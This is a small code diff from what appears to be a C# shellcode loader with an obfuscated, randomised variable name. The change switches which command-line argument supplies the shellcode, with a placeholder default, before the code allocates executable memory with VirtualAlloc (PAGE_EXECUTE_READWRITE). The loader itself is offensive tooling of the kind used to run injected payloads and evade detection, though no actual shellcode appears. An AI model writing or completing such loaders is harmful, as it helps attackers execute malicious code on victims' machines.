@@ -45,7 +45,7 @@
                 public static void Main(string[] args)
                 {										
                     // Check if shellcode is passed as an argument
-                    string strShellCode = args.Length > 1 ? args[1] : "YOURSHELLCODE"; // Default shellcode here
+                    string strShellCode = args.Length > 2 ? args[2] : "YOURSHELLCODE"; // Default shellcode here
 
                     // Convert shellcode input string into byte array
                     IntPtr ITGMyKKAUUm = VirtualAlloc(0,(UInt32)(strShellCode.Length / 2), 0x1000, 0x40);
